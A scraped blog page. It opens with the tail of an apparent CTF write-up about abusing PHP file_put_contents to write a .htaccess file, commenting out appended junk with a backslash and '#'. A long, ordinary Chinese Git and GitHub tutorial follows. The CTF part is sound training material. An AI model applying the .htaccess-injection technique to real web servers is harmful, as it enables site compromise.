<h3 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况"></a><strong>第三种情况</strong></h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="constructor">_put_contents($<span class="params">filename</span>,$<span class="params">content</span> . <span class="string">&quot;\nxxxxxx&quot;</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>面对此情况相对来说要比之前的两种还要在某种程度上来说要简单一点，我们只需要让后面的杂糅代码注释掉，或者分解掉都是可以的，目的就是不让杂糅代码干扰；</p>
<p>这种情形一般考点都是禁止有特殊起始符和结束符号的语言，举个例子，如果题目没有ban掉php，那么我们可以轻而易举的写入php代码，因为php代码有特殊的起始符和结束符，所以后面的杂糅代码，并不会对其产生什么影响</p>
<p>所以这类问题的考点，往往在于我们没有办法去写入这类的有特殊起始符和结束符号的语言，往往是需要想办法处理掉杂糅代码的；常见的考点是利用.htaccess进行操作；都知道，.htaccess文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用注释符将杂糅的代码进行注释，然后才可以正常访问；</p>
<p>这里对于换行符我们直接进行 <code>\</code> 注释即可。然后再嵌入#注释符，从而达到单行注释就可以将杂糅代码注释掉的效果；载荷效果如下</p>
<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/08/14/dPHxKA.png"><img src="https://s1.ax1x.com/2020/08/14/dPHxKA.png" alt="img"></a></p>
<p>可以发现直接利用，对于这种没有unlink的题目，我们也是可以反复写入.htaccess进行覆盖的，但是前提是我们写入的.htaccess文件格式不能出现错误，如果出现错误，则会触发报错，题目就会锁死。所以对待此类问题应当小心谨慎；回到刚才，我们可以反复的写入，那么我们就可以方法很多</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/22/Git/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/22/Git/" class="post-title-link" itemprop="url">Git</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-22 15:41:48" itemprop="dateCreated datePublished" datetime="2022-02-22T15:41:48+08:00">2022-02-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-02-25 22:28:18" itemprop="dateModified" datetime="2022-02-25T22:28:18+08:00">2022-02-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>8.6k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>8 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="第一章-Git概述"><a href="#第一章-Git概述" class="headerlink" title="第一章 Git概述"></a>第一章 Git概述</h1><p>注：GitHub用户名：cjtyx      git用户签名Echo   </p>
<p>Git 是一个免费的、开源的<strong>分布式版本控制系统</strong>，可以快速高效地处理从小型到大型的各种项目。<br>Git 易于学习，占地面积小，性能极快。它具有廉价的本地库，方便的暂存区域和多个工作流分支等特性。其性能优于Subversion、CVS，Perforce和ClearCase 等版本控制工具。</p>
<h2 id="1-1-何为版本控制"><a href="#1-1-何为版本控制" class="headerlink" title="1.1 何为版本控制"></a>1.1 何为版本控制</h2><p>版本控制是一种记录文件内容变化，以便将来查阅特定版本修订情况的系统。<br>版本控制其实最重要的是可以记录文件修改历史记录，从而让用户能够查看历史版本，方便版本切换。</p>
<p><img src="/2022/02/22/Git/image-20220222163221507.png" alt="image-20220222163221507"></p>
<h2 id="1-2-为什么需要版本控制"><a href="#1-2-为什么需要版本控制" class="headerlink" title="1.2 为什么需要版本控制"></a>1.2 为什么需要版本控制</h2><p>个人开发过渡到团队协作。</p>
<p><img src="/2022/02/22/Git/image-20220222163748125.png" alt="image-20220222163748125"></p>
<h2 id="1-3-版本控制工具"><a href="#1-3-版本控制工具" class="headerlink" title="1.3 版本控制工具"></a>1.3 版本控制工具</h2><ul>
<li>集中式版本控制工具</li>
</ul>
<p>CVS、 SVN(Subversion)、VSS….. .’<br>集中化的版本控制系统诸如CVS,SVN等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。多年以来，这已成为版本控制系统的标准做法。<br>这种做法带来了许多好处,每个人都可以在一定程度上看到项目中的其他人正在做些什么。而管理员也可以轻松掌控每个开发者的权限，并且管理一个集中化的版本控制系统，要远比在各个客户端上维护本地数据库来得轻松容易。<br>事分两面，有好有坏。这么做显而易见的缺点是中央服务器的单点故障。如果服务器宕机一小时，那么在这一小时内，谁都无法提交更新，也就无法协同工作。</p>
<p><img src="/2022/02/22/Git/image-20220222164857099.png" alt="image-20220222164857099"></p>
<ul>
<li>分布式版本控制工具</li>
</ul>
<p>Git、Mercurial、Bazaar、Darcs…….</p>
<p>像Git这种分布式版本控制工具，客户端提取的不是最新版本的文件快照，而是把代码仓库完整地镜像下来（本地库)。这样任何一处协同工作用的文件发生故障，事后都可以用其他客户端的本地仓库进行恢复。因为每个客户端的每一次文件提取操作，实际上都是一次对整个文件仓库的完整备份。<br>分布式的版本控制系统出现之后,解决了集中式版本控制系统的缺陷:</p>
<p>1.服务器断网的情况下也可以进行开发(因为版本控制是在本地进行的）</p>
<p>2.每个客户端保存的也都是整个完整的项目(包含历史记录，更加安全）</p>
<p><img src="/2022/02/22/Git/image-20220222165614170.png" alt="image-20220222165614170"></p>
<h2 id="1-4-Git工作机制"><a href="#1-4-Git工作机制" class="headerlink" title="1.4 Git工作机制"></a>1.4 Git工作机制</h2><p><img src="/2022/02/22/Git/image-20220222170405961.png" alt="image-20220222170405961"></p>
<h2 id="1-5-Git和代码托管中心"><a href="#1-5-Git和代码托管中心" class="headerlink" title="1.5 Git和代码托管中心"></a>1.5 Git和代码托管中心</h2><p>代码托管中心是基于网络服务器的远程代码仓库，一般我们简单称为远程库。</p>
<p>局域网<br>GitLab</p>
<p>互联网<br>GitHub(外网)<br>Gitee码云（国内网站)</p>
<h1 id="第二章-Git安装"><a href="#第二章-Git安装" class="headerlink" title="第二章 Git安装"></a>第二章 Git安装</h1><p>官网地址：<a target="_blank" rel="noopener" href="https://git-scm.com/">https://git-scm.com/</a></p>
<p><img src="/2022/02/22/Git/image-20220222223735156.png" alt="image-20220222223735156"></p>
<p>一路默认的</p>
<h1 id="第三章-Git常用命令"><a href="#第三章-Git常用命令" class="headerlink" title="第三章 Git常用命令"></a>第三章 Git常用命令</h1><p><img src="/2022/02/22/Git/image-20220222225044925.png" alt="image-20220222225044925"></p>
<h2 id="3-1-设置用户签名"><a href="#3-1-设置用户签名" class="headerlink" title="3.1 设置用户签名"></a>3.1 设置用户签名</h2><p>1）基本语法</p>
<p>git config –global user.name 用户名</p>
<p>git config –global user.email 邮箱</p>
<p><img src="/2022/02/22/Git/image-20220222225733501.png" alt="image-20220222225733501"></p>
<p>证明是否设置好：cat  ~/.gitconfig  或者  git config –global -l</p>
<p><img src="/2022/02/22/Git/image-20220222225858333.png" alt="image-20220222225858333"></p>
<p>说明:<br>签名的作用是区分不同操作者身份。用户的签名信息在每一个版本的提交信息中能够看到,以此确认本次提交是谁做的。Git首次安装必须设置一下用户签名，否则无法提交代码。<br>※注意:这里设置用户签名和将来登录GitHub(或其他代码托管中心）的账号没有任何关系。</p>
<h2 id="3-2-初始化本地库"><a href="#3-2-初始化本地库" class="headerlink" title="3.2 初始化本地库"></a>3.2 初始化本地库</h2><p>1）基本语法</p>
<p>git init</p>
<p>2）案例实操</p>
<p><img src="/2022/02/22/Git/image-20220223132547247.png" alt="image-20220223132547247"></p>
<p>ll -a  查看隐藏文件</p>
<p>git bash用的命令和Linux通用</p>
<h2 id="3-3-查看本地库状态"><a href="#3-3-查看本地库状态" class="headerlink" title="3.3 查看本地库状态"></a>3.3 查看本地库状态</h2><h3 id="3-3-1-首次查看（工作区没有任何文件）"><a href="#3-3-1-首次查看（工作区没有任何文件）" class="headerlink" title="3.3.1 首次查看（工作区没有任何文件）"></a>3.3.1 首次查看（工作区没有任何文件）</h3><p>git status</p>
<p><img src="/2022/02/22/Git/image-20220223132909924.png" alt="image-20220223132909924"></p>
<h3 id="3-3-2-新增文件（hello-txt）"><a href="#3-3-2-新增文件（hello-txt）" class="headerlink" title="3.3.2 新增文件（hello.txt）"></a>3.3.2 新增文件（hello.txt）</h3><p>vim里面yy是复制p是粘贴</p>
<p><img src="/2022/02/22/Git/image-20220223133407094.png" alt="image-20220223133407094"></p>
<h3 id="3-3-3-再次查看（检测到未追踪的文件）"><a href="#3-3-3-再次查看（检测到未追踪的文件）" class="headerlink" title="3.3.3 再次查看（检测到未追踪的文件）"></a>3.3.3 再次查看（检测到未追踪的文件）</h3><p><img src="/2022/02/22/Git/image-20220223133558246.png" alt="image-20220223133558246"></p>
<h2 id="3-4-添加暂存区"><a href="#3-4-添加暂存区" class="headerlink" title="3.4 添加暂存区"></a>3.4 添加暂存区</h2><h3 id="3-4-1-将工作区的文件添加到暂存区"><a href="#3-4-1-将工作区的文件添加到暂存区" class="headerlink" title="3.4.1 将工作区的文件添加到暂存区"></a>3.4.1 将工作区的文件添加到暂存区</h3><p>git add 文件名</p>
<p><img src="/2022/02/22/Git/image-20220223133948385.png" alt="image-20220223133948385"></p>
<p>警告：换行符LF将被CRLF替代  Linux换行符为LF，Windows换行符是CRLF。这个警告不用管</p>
<h3 id="3-4-2-查看状态（检测到暂存区有新文件）"><a href="#3-4-2-查看状态（检测到暂存区有新文件）" class="headerlink" title="3.4.2 查看状态（检测到暂存区有新文件）"></a>3.4.2 查看状态（检测到暂存区有新文件）</h3><p><img src="/2022/02/22/Git/image-20220223134211447.png" alt="image-20220223134211447"></p>
<p>暂存区的文件可以删除 ：git rm –cached 文件名，工作区文件还是在的</p>
<p><img src="/2022/02/22/Git/image-20220223134436436.png" alt="image-20220223134436436"></p>
<p><img src="/2022/02/22/Git/image-20220223134503854.png" alt="image-20220223134503854"></p>
<h2 id="3-5-提交本地库"><a href="#3-5-提交本地库" class="headerlink" title="3.5 提交本地库"></a>3.5 提交本地库</h2><h3 id="3-5-1-将暂存区的文件提交到本地库"><a href="#3-5-1-将暂存区的文件提交到本地库" class="headerlink" title="3.5.1 将暂存区的文件提交到本地库"></a>3.5.1 将暂存区的文件提交到本地库</h3><p>git commit -m “日志信息” 文件名</p>
<p><img src="/2022/02/22/Git/image-20220223200054569.png" alt="image-20220223200054569"></p>
<h3 id="3-5-2-查看状态（没有文件需要提交）"><a href="#3-5-2-查看状态（没有文件需要提交）" class="headerlink" title="3.5.2 查看状态（没有文件需要提交）"></a>3.5.2 查看状态（没有文件需要提交）</h3><p><img src="/2022/02/22/Git/image-20220223200131347.png" alt="image-20220223200131347"></p>
<p>查看版本 git reflog   或者 git log</p>
<p><img src="/2022/02/22/Git/image-20220223200933851.png" alt="image-20220223200933851"></p>
<h2 id="3-6-修改文件（hello-txt）"><a href="#3-6-修改文件（hello-txt）" class="headerlink" title="3.6 修改文件（hello.txt）"></a>3.6 修改文件（hello.txt）</h2><h3 id="3-6-1-查看状态（检测到工作区有文件被修改）"><a href="#3-6-1-查看状态（检测到工作区有文件被修改）" class="headerlink" title="3.6.1  查看状态（检测到工作区有文件被修改）"></a>3.6.1  查看状态（检测到工作区有文件被修改）</h3><p><img src="/2022/02/22/Git/image-20220223201554430.png" alt="image-20220223201554430"></p>
<h3 id="3-6-2-将修改的文件再次添加到暂存区"><a href="#3-6-2-将修改的文件再次添加到暂存区" class="headerlink" title="3.6.2 将修改的文件再次添加到暂存区"></a>3.6.2 将修改的文件再次添加到暂存区</h3><p><img src="/2022/02/22/Git/image-20220223201645975.png" alt="image-20220223201645975"></p>
<h3 id="3-6-3-查看状态（工作区的修改添加到了暂存区）"><a href="#3-6-3-查看状态（工作区的修改添加到了暂存区）" class="headerlink" title="3.6.3 查看状态（工作区的修改添加到了暂存区）"></a>3.6.3 查看状态（工作区的修改添加到了暂存区）</h3><p><img src="/2022/02/22/Git/image-20220223201705778.png" alt="image-20220223201705778"></p>
<h3 id="3-6-4-提交本地库"><a href="#3-6-4-提交本地库" class="headerlink" title="3.6.4 提交本地库"></a>3.6.4 提交本地库</h3><p>git commit -m “my second commit” hello.txt</p>
<p><img src="/2022/02/22/Git/image-20220223201842936.png" alt="image-20220223201842936"></p>
<p><img src="/2022/02/22/Git/image-20220223202021790.png" alt="image-20220223202021790"></p>
<h2 id="3-7-历史版本"><a href="#3-7-历史版本" class="headerlink" title="3.7 历史版本"></a>3.7 历史版本</h2><h3 id="3-7-1-查看历史版本"><a href="#3-7-1-查看历史版本" class="headerlink" title="3.7.1 查看历史版本"></a>3.7.1 查看历史版本</h3><p>git reflog   查看版本信息</p>
<p>git log   查看版本详细信息</p>
<p><img src="/2022/02/22/Git/image-20220223202021790.png" alt="image-20220223202021790"></p>
<p><img src="/2022/02/22/Git/image-20220223202803846.png" alt="image-20220223202803846"></p>
<h3 id="3-7-2-版本穿梭"><a href="#3-7-2-版本穿梭" class="headerlink" title="3.7.2 版本穿梭"></a>3.7.2 版本穿梭</h3><p>git reset –hard 版本号</p>
<p><img src="/2022/02/22/Git/image-20220223202600392.png" alt="image-20220223202600392"></p>
<p><img src="/2022/02/22/Git/image-20220223203018161.png" alt="image-20220223203018161"></p>
<p><img src="/2022/02/22/Git/image-20220223202613569.png" alt="image-20220223202613569"></p>
<h1 id="第四章-Git分支操作"><a href="#第四章-Git分支操作" class="headerlink" title="第四章 Git分支操作"></a>第四章 Git分支操作</h1><p><img src="/2022/02/22/Git/image-20220223204103328.png" alt="image-20220223204103328"></p>
<h2 id="4-1-什么是分支"><a href="#4-1-什么是分支" class="headerlink" title="4.1 什么是分支"></a>4.1 什么是分支</h2><p>在版本控制过程中，同时推进多个任务，为每个任务，我们就可以创建每个任务的单独分支。使用分支意味着程序员可以把自己的工作从开发主线上分离开来，开发自己分支的时候，不会影响主线分支的运行。对于初学者而言，分支可以简单理解为副本，一个分支就是一个单独的副本。(分支底层其实也是指针的引用)</p>
<p><img src="/2022/02/22/Git/image-20220223211510203.png" alt="image-20220223211510203"></p>
<h2 id="4-2-分支的好处"><a href="#4-2-分支的好处" class="headerlink" title="4.2 分支的好处"></a>4.2 分支的好处</h2><p>同时并行推进多个功能开发，提高开发效率。<br>各个分支在开发过程中，如果某一个分支开发失败，不会对其他分支有任何影响。失败的分支删除重新开始即可。</p>
<h2 id="4-3-分支的操作"><a href="#4-3-分支的操作" class="headerlink" title="4.3 分支的操作"></a>4.3 分支的操作</h2><p><img src="/2022/02/22/Git/image-20220223211647861.png" alt="image-20220223211647861"></p>
<h3 id="4-3-1-查看分支"><a href="#4-3-1-查看分支" class="headerlink" title="4.3.1 查看分支"></a>4.3.1 查看分支</h3><p>git branch -v</p>
<p><img src="/2022/02/22/Git/image-20220223211927913.png" alt="image-20220223211927913"></p>
<h3 id="4-3-2-创建分支"><a href="#4-3-2-创建分支" class="headerlink" title="4.3.2 创建分支"></a>4.3.2 创建分支</h3><p>git branch 分支名</p>
<p>创建一个热修分支（修复）：<img src="/2022/02/22/Git/image-20220223212213235.png" alt="image-20220223212213235"></p>
<h3 id="4-3-3-切换分支与修改分支"><a href="#4-3-3-切换分支与修改分支" class="headerlink" title="4.3.3 切换分支与修改分支"></a>4.3.3 切换分支与修改分支</h3><p>切换：git checkout 分支名</p>
<p><img src="/2022/02/22/Git/image-20220223212734467.png" alt="image-20220223212734467"></p>
<p>hello.txt仍然在，修改hello.txt</p>
<p><img src="/2022/02/22/Git/image-20220223213012342.png" alt="image-20220223213012342"></p>
<p>添加暂存区，提交本地库<img src="/2022/02/22/Git/image-20220223213320907.png" alt="image-20220223213320907"></p>
<h3 id="4-3-4-合并分支"><a href="#4-3-4-合并分支" class="headerlink" title="4.3.4 合并分支"></a>4.3.4 合并分支</h3><p>git merge 分支名</p>
<p>切换回master分支</p>
<p><img src="/2022/02/22/Git/image-20220223213653996.png" alt="image-20220223213653996"></p>
<p>合并分支：</p>
<p><img src="/2022/02/22/Git/image-20220223213835709.png" alt="image-20220223213835709"></p>
<p>查看当前分支文件状态：</p>
<p><img src="/2022/02/22/Git/image-20220223213927615.png" alt="image-20220223213927615"></p>
<h3 id="4-3-5-产生冲突"><a href="#4-3-5-产生冲突" class="headerlink" title="4.3.5 产生冲突"></a>4.3.5 产生冲突</h3><p>冲突产生的原因:<br>合并分支时，两个分支在同一个文件的同一个位置有两套完全不同的修改。Git无法替我们决定使用哪一个。必须人为决定新代码内容。</p>
<p>在master上修改：</p>
<p><img src="/2022/02/22/Git/image-20220223214402900.png" alt="image-20220223214402900"></p>
<p>添加暂存区，提交本地库</p>
<p>切换分支：hot-fix ,修改hello.txt</p>
<p><img src="/2022/02/22/Git/image-20220223214850106.png" alt="image-20220223214850106"></p>
<p>添加暂存区，提交本地库。切回master，合并分支，报冲突</p>
<p><img src="/2022/02/22/Git/image-20220223215237312.png" alt="image-20220223215237312"></p>
<h3 id="4-3-6-解决冲突"><a href="#4-3-6-解决冲突" class="headerlink" title="4.3.6 解决冲突"></a>4.3.6 解决冲突</h3><p>手动合并代码，手动打开文件：</p>
<p><img src="/2022/02/22/Git/image-20220223215355470.png" alt="image-20220223215355470"></p>
<p>把master test下一行，hot-fix上一行，以及那些特殊符号的行删掉</p>
<p><img src="/2022/02/22/Git/image-20220223215702867.png" alt="image-20220223215702867"></p>
<p>保存完文件后：添加暂存区，提交本地库<strong>（注意：此时提交本地库命令时不能带文件名）</strong> 否则报错：<img src="/2022/02/22/Git/image-20220223220403901.png" alt="image-20220223220403901"></p>
<p>因此：不能带文件名：<img src="/2022/02/22/Git/image-20220223220506070.png" alt="image-20220223220506070"></p>
<p>hot-fix分支下仍为下图所示，没有master test，只有合并到的分支才改变</p>
<p><img src="/2022/02/22/Git/image-20220223220737847.png" alt="image-20220223220737847"></p>
<h2 id="4-4-创建分支和切换分支图解"><a href="#4-4-创建分支和切换分支图解" class="headerlink" title="4.4 创建分支和切换分支图解"></a>4.4 创建分支和切换分支图解</h2><p><img src="/2022/02/22/Git/image-20220223220956419.png" alt="image-20220223220956419"></p>
<p><img src="/2022/02/22/Git/image-20220223221016099.png" alt="image-20220223221016099"></p>
<h1 id="第五章-Git团队协作机制"><a href="#第五章-Git团队协作机制" class="headerlink" title="第五章 Git团队协作机制"></a>第五章 Git团队协作机制</h1><p><img src="/2022/02/22/Git/image-20220223222620011.png" alt="image-20220223222620011"></p>
<h2 id="5-1-团队内协作"><a href="#5-1-团队内协作" class="headerlink" title="5.1 团队内协作"></a>5.1 团队内协作</h2><p><img src="/2022/02/22/Git/image-20220223222722893.png" alt="image-20220223222722893"></p>
<p>push ：推送            clone：克隆，完整复制到本地库        pull：拉取</p>
<p>pull是本地有文件，对本地库已有文件代码更新；clone是本地无源代码</p>
<h2 id="5-2-跨团队协作"><a href="#5-2-跨团队协作" class="headerlink" title="5.2 跨团队协作"></a>5.2 跨团队协作</h2><p><img src="/2022/02/22/Git/image-20220223223330616.png" alt="image-20220223223330616"></p>
<p>fork:  将代码从一个远程库复制到另一个远程库</p>
<p>git的版本控制都是在本地库里做的</p>
<h1 id="第六章-GitHub操作"><a href="#第六章-GitHub操作" class="headerlink" title="第六章 GitHub操作"></a>第六章 GitHub操作</h1><p><a target="_blank" rel="noopener" href="https://github.com/">https://github.com</a></p>
<h2 id="6-1-创建远程仓库"><a href="#6-1-创建远程仓库" class="headerlink" title="6.1 创建远程仓库"></a>6.1 创建远程仓库</h2><p><img src="/2022/02/22/Git/image-20220223224929261.png" alt="image-20220223224929261"></p>
<p>远程库的名字与本地库一样，本地库自己设置的叫git-demo</p>
<p><img src="/2022/02/22/Git/image-20220223225409252.png" alt="image-20220223225409252"></p>
<p>远程库链接</p>
<p><img src="/2022/02/22/Git/image-20220223225505833.png" alt="image-20220223225505833"></p>
<h2 id="6-2-远程仓库操作"><a href="#6-2-远程仓库操作" class="headerlink" title="6.2 远程仓库操作"></a>6.2 远程仓库操作</h2><p><img src="/2022/02/22/Git/image-20220223225543461.png" alt="image-20220223225543461"></p>
<h3 id="6-2-1-创建远程仓库别名"><a href="#6-2-1-创建远程仓库别名" class="headerlink" title="6.2.1 创建远程仓库别名"></a>6.2.1 创建远程仓库别名</h3><p>git remote -v 查看当前所有远程地址别名</p>
<p>git remote add 别名 远程地址</p>
<p><img src="/2022/02/22/Git/image-20220223225837966.png" alt="image-20220223225837966"></p>
<p>两个的意思是既可以推送也可以拉取</p>
<h3 id="6-2-2-推送本地分支到远程仓库"><a href="#6-2-2-推送本地分支到远程仓库" class="headerlink" title="6.2.2 推送本地分支到远程仓库"></a>6.2.2 推送本地分支到远程仓库</h3><p>git push 别名 分支</p>
<p><img src="/2022/02/22/Git/image-20220224105940039.png" alt="image-20220224105940039"></p>
<p><img src="/2022/02/22/Git/image-20220224110106845.png" alt="image-20220224110106845"></p>
<h3 id="6-2-3-拉取远程仓库到本地"><a href="#6-2-3-拉取远程仓库到本地" class="headerlink" title="6.2.3 拉取远程仓库到本地"></a>6.2.3 拉取远程仓库到本地</h3><p>拉取：git pull 别名 分支</p>
<p>远程库修改了文件：<img src="/2022/02/22/Git/image-20220224110428884.png" alt="image-20220224110428884"></p>
<p>和本地库不一致，拉取到本地库：</p>
<p><img src="/2022/02/22/Git/image-20220224110634193.png" alt="image-20220224110634193"></p>
<p><img src="/2022/02/22/Git/image-20220224110758579.png" alt="image-20220224110758579"></p>
<h3 id="6-2-4-克隆远程仓库到本地"><a href="#6-2-4-克隆远程仓库到本地" class="headerlink" title="6.2.4 克隆远程仓库到本地"></a>6.2.4 克隆远程仓库到本地</h3><p>git clone 远程地址</p>
<p><img src="/2022/02/22/Git/image-20220224113927968.png" alt="image-20220224113927968"></p>
<p><img src="/2022/02/22/Git/image-20220224114413305.png" alt="image-20220224114413305"></p>
<p>小结：clone会做如下操作：1、拉取代码；2、初始化本地仓库；3、创建别名</p>
<h3 id="6-2-5-邀请加入团队"><a href="#6-2-5-邀请加入团队" class="headerlink" title="6.2.5 邀请加入团队"></a>6.2.5 邀请加入团队</h3><p><img src="/2022/02/22/Git/image-20220224115620747.png" alt="image-20220224115620747"></p>
<p>同一团队才能推送代码: git push 链接 分支 </p>
<p> 邀请团队：Settings-&gt;Manage access-&gt;Invite a collaborator-&gt;复制邀请函（链接地址）-&gt;团队成员在自己GitHub链接哪儿粘贴邀请函链接-&gt;accept</p>
<p><img src="/2022/02/22/Git/image-20220224115912094.png" alt="image-20220224115912094"></p>
<p><img src="/2022/02/22/Git/image-20220224120114334.png" alt="image-20220224120114334"></p>
<p><img src="/2022/02/22/Git/image-20220224120218792.png" alt="image-20220224120218792"></p>
<p><img src="/2022/02/22/Git/image-20220224120253388.png" alt="image-20220224120253388"></p>
<p>团队成员账号登录后：<img src="/2022/02/22/Git/image-20220224120446181.png" alt="image-20220224120446181"></p>
<p><img src="/2022/02/22/Git/image-20220224120506194.png" alt="image-20220224120506194"></p>
<p>同意后就可在团队成员账号上看到创始人的远程库，就可以推送了</p>
<p><img src="/2022/02/22/Git/image-20220224120726893.png" alt="image-20220224120726893"></p>
<h2 id="6-3-跨团队协作"><a href="#6-3-跨团队协作" class="headerlink" title="6.3 跨团队协作"></a>6.3 跨团队协作</h2><p><img src="/2022/02/22/Git/image-20220223223330616.png" alt="image-20220223223330616"></p>
<p>团队外的人访问别人库链接-&gt;点Fork-&gt;在自己账号内修改完后-&gt;Pull requests-&gt;</p>
<p><img src="/2022/02/22/Git/image-20220224121457775.png" alt="image-20220224121457775"></p>
<p>fork之后在自己账号下就有了一个git-demo,就可以修改代码了<img src="/2022/02/22/Git/image-20220224121649509.png" alt="image-20220224121649509"></p>
<p><img src="/2022/02/22/Git/image-20220224121944351.png" alt="image-20220224121944351"></p>
<p><img src="/2022/02/22/Git/image-20220224143110032.png" alt="image-20220224143110032"></p>
<p>再在创建团队的那个人的账号内<img src="/2022/02/22/Git/image-20220224143407764.png" alt="image-20220224143407764"></p>
<p> 有一个Pull requests<img src="/2022/02/22/Git/image-20220224143446634.png" alt="image-20220224143446634"></p>
<p>确认代码后,提交合并申请：<img src="/2022/02/22/Git/image-20220224143652221.png" alt="image-20220224143652221"></p>
<p>并确认：<img src="/2022/02/22/Git/image-20220224143733220.png" alt="image-20220224143733220"></p>
<h2 id="6-4-SSH免密登录"><a href="#6-4-SSH免密登录" class="headerlink" title="6.4 SSH免密登录"></a>6.4 SSH免密登录</h2><p>远程仓库中还有一个SSH的地址，因此也可以使用SSH进行访问<img src="/2022/02/22/Git/image-20220224143952661.png" alt="image-20220224143952661"></p>
<p>C:/用户/DELL/.ssh</p>
<p><img src="/2022/02/22/Git/image-20220224144634345.png" alt="image-20220224144634345"></p>
<p>连续敲三次回车：<img src="/2022/02/22/Git/image-20220224144710503.png" alt="image-20220224144710503"></p>
<p><img src="/2022/02/22/Git/image-20220224145004685.png" alt="image-20220224145004685"></p>
<p>将公钥，也就是上图，复制到GitHub账号</p>
<p>Settings-&gt;SSH and GPG keys-&gt;New SSH key 这样Windows连接此账号就不需要反复输入账号密码</p>
<p><img src="/2022/02/22/Git/image-20220224145113677.png" alt="image-20220224145113677"></p>
<p><img src="/2022/02/22/Git/image-20220224145200959.png" alt="image-20220224145200959"></p>
<p><img src="/2022/02/22/Git/image-20220224145410299.png" alt="image-20220224145410299"></p>
<p>就可以git pull SSH</p>
<p>例如：git pull <a href="mailto:&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#104;&#117;&#98;&#46;&#x63;&#x6f;&#109;">&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#104;&#117;&#98;&#46;&#x63;&#x6f;&#109;</a>:cjtyx/git-demo.git</p>
<h1 id="第七章-IDEA集成Git"><a href="#第七章-IDEA集成Git" class="headerlink" title="第七章 IDEA集成Git"></a>第七章 IDEA集成Git</h1><h2 id="7-1-配置Git忽略文件"><a href="#7-1-配置Git忽略文件" class="headerlink" title="7.1 配置Git忽略文件"></a>7.1 配置Git忽略文件</h2><p>idea 特定文件，让git忽略</p>
<p><img src="/2022/02/22/Git/image-20220224151555215.png" alt="image-20220224151555215"></p>
<p>问题1：为什么要忽略他们？</p>
<p>答：与项目的实际功能无关，不参与服务器上部署运行。把他们忽略掉能够屏蔽IDE工具之间的差异</p>
<p>问题2：怎么忽略？</p>
<p>1）创建忽略规则文件 xxxx.ignore(前缀名随便起，建议是git.ignore)</p>
<p>这个文件的存放位置原则是哪里都可以，为了便于让~/.gitconfig文件引用，建议放在用户家目录下</p>
<p>git.ignore 文件模板内容如下：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compiled class file</span></span><br><span class="line">*<span class="string">.class</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Log file</span></span><br><span class="line">*<span class="string">.log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># BlueJ files</span></span><br><span class="line">*<span class="string">.ctxt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mobile Tools for Java (J2ME)</span></span><br><span class="line"><span class="string">.mtj.tmp/</span><span class="comment"># Package Files #</span></span><br><span class="line">*<span class="string">.jar</span></span><br><span class="line">*<span class="string">.war</span></span><br><span class="line">*<span class="string">.nar</span></span><br><span class="line">*<span class="string">.ear</span></span><br><span class="line">*<span class="string">.zip</span></span><br><span class="line">*<span class="string">.tar.gz</span></span><br><span class="line">*<span class="string">.rar</span></span><br><span class="line"></span><br><span class="line">hs_err_pid*</span><br><span class="line"></span><br><span class="line"><span class="string">.classpath</span></span><br><span class="line"><span class="string">.project</span></span><br><span class="line"><span class="string">.settings</span></span><br><span class="line">target</span><br><span class="line"><span class="string">.idea</span></span><br><span class="line">*<span class="string">.iml</span></span><br></pre></td></tr></table></figure>

